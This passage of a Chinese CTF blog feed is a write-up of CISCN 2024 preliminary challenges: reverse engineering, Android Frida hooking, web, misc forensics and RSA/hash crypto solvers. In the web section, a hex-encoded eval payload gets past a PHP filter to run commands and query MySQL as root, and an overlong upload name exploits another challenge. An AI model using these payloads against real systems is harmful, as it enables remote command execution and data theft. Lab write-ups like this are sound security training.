class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">target=<span class="string">b&#x27;congratulationstoyoucongratulationstoy&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare</span>(<span class="params">s1,s2</span>):</span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">        <span class="keyword">if</span> s1[i]==s2[i]:</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line">model=<span class="string">&#x27;flag&#123;78bace5989660ee38f1fd980xxxxxxxx&#125;&#x27;</span></span><br><span class="line">now=<span class="number">6</span>+<span class="number">24</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    <span class="keyword">if</span> model[i]!=<span class="string">&#x27;x&#x27;</span>:<span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x21</span>,<span class="number">0x7f</span>):</span><br><span class="line">        flag=model[:i]+<span class="built_in">chr</span>(k)+model[i+<span class="number">1</span>:]</span><br><span class="line">        p=process(<span class="string">&#x27;./gdb_debug&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Please enter the flag string (ensuring the format is &#x27;flag&#123;&#125;&#x27; and the total length is 38 characters).&quot;</span>,flag)</span><br><span class="line">        p.recvline()</span><br><span class="line">        p.recvline()</span><br><span class="line">        s=p.recvuntil(<span class="string">&#x27;Error&#x27;</span>)[:-<span class="number">6</span>]</span><br><span class="line">        <span class="keyword">if</span> compare(s,target)==now+<span class="number">1</span>:</span><br><span class="line">            model=model[:i]+<span class="built_in">chr</span>(k)+model[i+<span class="number">1</span>:]</span><br><span class="line">            now+=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(model)</span><br><span class="line">            p.shutdown()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p.shutdown()</span><br><span class="line"><span class="comment">#flag&#123;78bace5989660ee38f1fd980a4b4fbcd&#125;</span></span><br></pre></td></tr></table></figure><p>now变量控制当前有几个字符是密文一样的，因为没有控制字符集，一次运行不完（进程太多了），但是每次都会输出结果，因此分多次跑很快可以跑完。</p><p>这里需要patch原来的程序，将 strcmp 改为输出密文字符串。</p><img src="/2024/05/19/CISCN2024/1.png" class=""><p>E8 84 字节 改为 E8 44 （即把strcmp的plt改成puts的plt偏移）</p><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>反编译得到AES加密密文</p><img src="/2024/05/19/CISCN2024/7.png" class=""><p>使用Frida进行hook得到key和iv</p><figure class="highlight plaintext"><figcaption><span>脚本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        var jni = Java.use(&quot;com.example.re11113.jni&quot;);</span><br><span class="line">        jni.getkey.overload().implementation = function () &#123;</span><br><span class="line">            var key = this.getkey();</span><br><span class="line">            var iv = this.getiv();</span><br><span class="line">            console.log(&quot;Key:&quot;, key);</span><br><span class="line">            console.log(&quot;iv:&quot;, iv);</span><br><span class="line">            sead(&quot;Key:&quot;, key);</span><br><span class="line"></span><br><span class="line">            return key;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br><span class="line">import frida</span><br><span class="line">import sys</span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#x27;type&#x27;] == &#x27;send&#x27;:</span><br><span class="line">        print(message[&#x27;payload&#x27;])</span><br><span class="line">        print(&quot;&#123;0&#125;&quot;.format(message[&#x27;payload&#x27;]))</span><br><span class="line">    else:</span><br><span class="line">        print(str(message))</span><br><span class="line">with open(&#x27;code.js&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    js_code = f.read()</span><br><span class="line">session = frida.get_remote_device().attach(&#x27;Re11113&#x27;)</span><br><span class="line">script = session.create_script(js_code)</span><br><span class="line">script.on(&#x27;message&#x27;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>得到key和iv</p><img src="/2024/05/19/CISCN2024/8.png" class=""><p>使用key和iv解密得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import DES</span><br><span class="line">from Crypto.Util.Padding import unpad</span><br><span class="line"></span><br><span class="line">def encode(encrypted_message, key, iv):</span><br><span class="line">        cipher = DES.new(key, DES.MODE_CBC, iv)</span><br><span class="line">        decrypted_bytes = cipher.decrypt(base64.b64decode(encrypted_message))</span><br><span class="line">        decrypted_message = unpad(decrypted_bytes, DES.block_size).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        return decrypted_message</span><br><span class="line">enmessage = &quot;JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==&quot;</span><br><span class="line">key = b&#x27;A8UdWaeq&#x27;</span><br><span class="line">iv = b&#x27;Wf3DLups&#x27;</span><br><span class="line">demessage = encode(enmessage, key, iv)</span><br><span class="line">print(demessage)</span><br></pre></td></tr></table></figure><img src="/2024/05/19/CISCN2024/9.png" class=""><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h3><p>读源码发现没有过滤php，传入php –version发现可以执行</p><img src="/2024/05/19/CISCN2024/2.png" class=""><p>没有过滤eval，但过滤base64和url，尝试使用16进制编码,首先尝试执行系统命令，对whoami编码得到6563686F206077686F616D69603B，但单引号和双引号被过滤，加上_得到_6563686F206077686F616D69603B，发现可以RCE</p><img src="/2024/05/19/CISCN2024/3.png" class=""><p>在数据库中发现flag，payload：Echo <code>mysql -u root -p ‘root’ -e ‘use PHP_CMS;select * from F1ag_Se3Re7;’</code>;</p><p>进行十六进制编码得到<br>cmd&#x3D;php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</p><img src="/2024/05/19/CISCN2024/4.png" class=""><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="打卡"><a href="#打卡" class="headerlink" title="打卡"></a>打卡</h3><p>答完题发现直接给了flag</p><img src="/2024/05/19/CISCN2024/10.png" class=""><h3 id="盗版软件"><a href="#盗版软件" class="headerlink" title="盗版软件"></a>盗版软件</h3><p>根据题目描述可知dmp为浏览器文件，更改后缀为data原始数据，gimp调整位移</p><img src="/2024/05/19/CISCN2024/11.png" class=""><p>得到域名winhack.com，虚拟机中双击exe运行出一张图片，zsteg大致看了下发现lsb确实有东西，用stegsolve细致看看</p><img src="/2024/05/19/CISCN2024/12.png" class=""><p>发现red全通道有个压缩包，但是文件被间隔开了，利用脚本进行提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract_alternate_bytes</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> infile, <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">            byte = infile.read(<span class="number">1</span>)  <span class="comment"># 读取第一个字节</span></span><br><span class="line">            <span class="keyword">while</span> byte:</span><br><span class="line">                outfile.write(byte)  <span class="comment"># 写入这个字节到输出文件</span></span><br><span class="line">                infile.seek(<span class="number">1</span>, <span class="number">1</span>)  <span class="comment"># 跳过下一个字节</span></span><br><span class="line">                byte = infile.read(<span class="number">1</span>)  <span class="comment"># 读取下一个字节</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;提取完成，结果已保存到 <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;出现错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">input_file = <span class="string">&#x27;1&#x27;</span>  <span class="comment"># 为stegsolve导出的文件16进制</span></span><br><span class="line">output_file = <span class="string">&#x27;1.zip&#x27;</span>  <span class="comment"># 替换为你的输出文件名</span></span><br><span class="line">extract_alternate_bytes(input_file, output_file)</span><br></pre></td></tr></table></figure><p>得到压缩包中一个.b文件，base85解码之后微步分析</p><img src="/2024/05/19/CISCN2024/13.png" class=""><p>得到ip，39.100.72.235</p><img src="/2024/05/19/CISCN2024/14.png" class=""><p>得到flag <code>flag&#123;096e8b0f9daf10869f013c1b7efda3fd&#125;</code></p><h3 id="通风机"><a href="#通风机" class="headerlink" title="通风机"></a>通风机</h3><p>上网搜了下mwp后缀文件搜索软件最终找到了STEP 7-MicroWIN SMART一开始发现文件导不进去，对比了下正确文件的文件头，修补一下文件头。</p><img src="/2024/05/19/CISCN2024/15.png" class=""><p>打开之后在符号表中找到了flag的base64编码</p><img src="/2024/05/19/CISCN2024/16.png" class=""><p>直接base64解码一下得到flag</p><p><code>flag&#123;2467ce26-fff9-4008-8d55-17df83ecbfc2&#125;</code></p><h3 id="神秘文件"><a href="#神秘文件" class="headerlink" title="神秘文件"></a>神秘文件</h3><ol><li>ppt中找到密文得到part4：6f-40</li><li>ppt备注找到密文，base64循环解密之后得到part5：5f-90d</li><li>缩小后发现密文，得到part6：d-2</li><li>解压文件有一张图片 <img src="/2024/05/19/CISCN2024/17.png" class="">part9：dee</li><li>在ppt&#x2F;comments&#x2F;comment1.xml文件中找到part10：9}</li><li>在ppt\embeddings中可以找到一个word，从中可以获得凯撒解密获得part2：675efb</li><li>在ppt&#x2F;slideLayouts&#x2F;slideLayout2.xml中找到密文，去点多余的字符，解密得到part8：87e</li><li>ppt&#x2F;slides&#x2F;slide4.xml中找到密文，rot13后解密得part7：22b3</li><li>在\docProps\core.xml中找到密文密钥，使用Bifid解密得到part1：flag{e</li><li>ppt的vbaProject.bin文件中找到一串密文，rc4解密后得到part3：3-34</li></ol><p>按顺序拼接即是flag。flag{e675efb3-346f-405f-90dd-222b387edee9}</p><h3 id="大学生安全测试能力调研问卷"><a href="#大学生安全测试能力调研问卷" class="headerlink" title="大学生安全测试能力调研问卷"></a>大学生安全测试能力调研问卷</h3><p>略</p><h3 id="p-p"><a href="#p-p" class="headerlink" title="p&amp;p"></a>p&amp;p</h3><p>按照主页提示拿到 <a href="http://www.zip/">www.zip</a> 源码。</p><p>将vuln.wasm拖入jeb分析，在 f15 中找到了主逻辑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __f15() &#123;</span><br><span class="line">    __f13();</span><br><span class="line">    __f14();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键步骤__f14(),通过测试是将flag.txt写入file.txt的位置</p><p>经过分析发现 164 个字符可以写到 file.txt 的位置，又因为被限制只能写入8个字符，而当前目录任意文件名长度为1的文件即可满足要求<code>static/x</code>。</p><p>exp：</p><p>顺序访问以下路由即可得到flag文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/upload?name=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaastatic/a</span><br><span class="line">/test</span><br><span class="line">/static/a</span><br></pre></td></tr></table></figure><p>flag{4c11b668-5872-4066-8ec5-50c87134972d}</p><h3 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power Trajectory Diagram"></a>Power Trajectory Diagram</h3><p>根据题目描述</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">f = np.load(<span class="string">&#x27;attachment.npz&#x27;</span>)</span><br><span class="line">index = f[<span class="string">&#x27;index&#x27;</span>]</span><br><span class="line">inputs = f[<span class="string">&#x27;input&#x27;</span>]</span><br><span class="line">traces = f[<span class="string">&#x27;trace&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> iteration <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    t = []</span><br><span class="line">    table = inputs[<span class="number">40</span>*iteration:<span class="number">40</span>*(iteration+<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        min_index = np.argmin(traces[iteration*<span class="number">40</span> + i])</span><br><span class="line">        t.append(min_index)</span><br><span class="line">    max_index = np.argmax(t)</span><br><span class="line">    ch = table[max_index]</span><br><span class="line">    <span class="built_in">print</span>(ch, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>解出flag <code>flag&#123;_ciscn_2024_&#125;</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><img src="/2024/05/19/CISCN2024/18.png" class=""><p>flag flag{b2bb0873-8cae-4977-a6de-0e298f0744c3}</p><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>通过查阅文献了解到 python2.7 的hash函数返回值是 64 位的 int 数，因此做的计算相当于会对 1&lt;&lt;64 取模。</p><p>根据计算的特点写出脚本计算七位随机值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib,binascii</span><br><span class="line">l=<span class="number">64</span></span><br><span class="line">mask=(<span class="number">1</span>&lt;&lt;<span class="number">64</span>)-<span class="number">1</span></span><br><span class="line"><span class="built_in">dict</span>=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    x=(x^(a&lt;&lt;<span class="number">7</span>))&amp;mask</span><br><span class="line">    x = ((x * <span class="number">1000003</span>) ^ a) &amp; mask</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x2=((x*<span class="number">1000003</span>)^b)&amp;mask</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            x3=((x2*<span class="number">1000003</span>)^c)&amp;mask</span><br><span class="line">            <span class="built_in">dict</span>[x3]=<span class="built_in">bytes</span>([a,b,c])</span><br><span class="line">ni=inverse(<span class="number">1000003</span>,<span class="number">1</span>&lt;&lt;<span class="number">64</span>)</span><br><span class="line">r=<span class="number">7457312583301101235</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    r1=((r^a)*ni)&amp;mask</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        r2=((r1^b)*ni)&amp;mask</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            r3 = ((r2 ^ c) * ni) &amp; mask</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                r4 = ((r3 ^ d) * ni) &amp; mask</span><br><span class="line">                <span class="keyword">if</span> r4 <span class="keyword">in</span> <span class="built_in">dict</span>.keys():</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">dict</span>[r4]+<span class="built_in">bytes</span>([d,c,b,a]))</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到key的值为 <code>b&#39;]\x8c\xf0?Z\x08R&#39;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># Python 2.7 (64-bit version)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, binascii, hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">key = <span class="string">b&#x27;]\x8c\xf0?Z\x08R&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(key))</span><br><span class="line">flag=<span class="number">13903983817893117249931704406959869971132956255130487015289848690577655239262013033618370827749581909492660806312017</span></span><br><span class="line"><span class="built_in">print</span> (long_to_bytes(<span class="built_in">int</span>(hashlib.sha384(binascii.hexlify(key)).hexdigest(), <span class="number">16</span>) ^ flag))</span><br></pre></td></tr></table></figure><p>运行即可得到flag <code>flag&#123;bdb537aa-87ef-4e95-bea4-2f79259bdd07&#125;</code></p><h3 id="OvO"><a href="#OvO" class="headerlink" title="OvO"></a>OvO</h3><p>直接令 rr&#x3D;e&#x2F;&#x2F;n，因为可以发现其它常数基本远小于 rr*N 的数量级，kk&#x3D;rr-2。</p><p>联立方程可以得到 p 的近似值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">n = <span class="number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line">e = <span class="number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line"></span><br><span class="line">rr = e//n</span><br><span class="line">kk = rr-<span class="number">2</span></span><br><span class="line">xx = sympy.symbols(<span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line">s = (kk+rr)*xx*xx +(rr*n+rr+<span class="number">65538</span>-e)*xx + rr*n</span><br><span class="line">xx = sympy.solve(s,<span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(xx[<span class="number">1</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行之后得到P的近似值</p><img src="/2024/05/19/CISCN2024/19.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061518425294700379906584666</span></span><br></pre></td></tr></table></figure><p>做法参考了本篇博客 <a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130171830%E3%80%82">https://blog.csdn.net/XiongSiqi_blog/article/details/130171830。</a></p><p>得到近似值之后变为 partial p 的问题，网上脚本也挺多的，这里参考了这一偏文章 <a href="https://dunkirkturbo.github.io/2020/02/28/Summary-of-Crypto-in-CTF-RSA/">https://dunkirkturbo.github.io/2020/02/28/Summary-of-Crypto-in-CTF-RSA/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line">e = <span class="number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line">pbar = <span class="number">9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061518425294700379906584666</span></span><br><span class="line">kbits = <span class="number">100</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">p = x0 + pbar</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p:&quot;</span>, p)</span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br></pre></td></tr></table></figure><img src="/2024/05/19/CISCN2024/20.png" class=""><p>成功分解 p 和 q 之后，就是正常的 RSA 解密算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line">e = <span class="number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line">p = <span class="number">9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061522496169870935934745091</span></span><br><span class="line">q = n//p</span><br><span class="line">rr = e//n</span><br><span class="line">kk = rr-<span class="number">2</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span> + kk * p + rr * ((p+<span class="number">1</span>) * (q+<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><p>得到flag ：flag{b5f771c6-18df-49a9-9d6d-ee7804f5416c}</p>]]></content>
    
    
    <summary type="html">记录一下CISCN2024的初赛</summary>
    
    
    
    <category term="CTF" scheme="https://xia0ji233.github.io/categories/CTF/"/>
    
    <category term="CISCN" scheme="https://xia0ji233.github.io/categories/CTF/CISCN/"/>
    
    <category term="2024" scheme="https://xia0ji233.github.io/categories/CTF/CISCN/2024/"/>
    
    
  </entry>
  
  <entry>
    <title>游戏安全的学习（5）</title>
    <link href="https://xia0ji233.github.io/2024/04/25/Game5/"/>
    <id>https://xia0ji233.github.io/2024/04/25/Game5/</id>
    <published>2024-04-25T07:00:00.000Z</published>
    <updated>2024-05-13T02:26:52.892Z</updated>
    
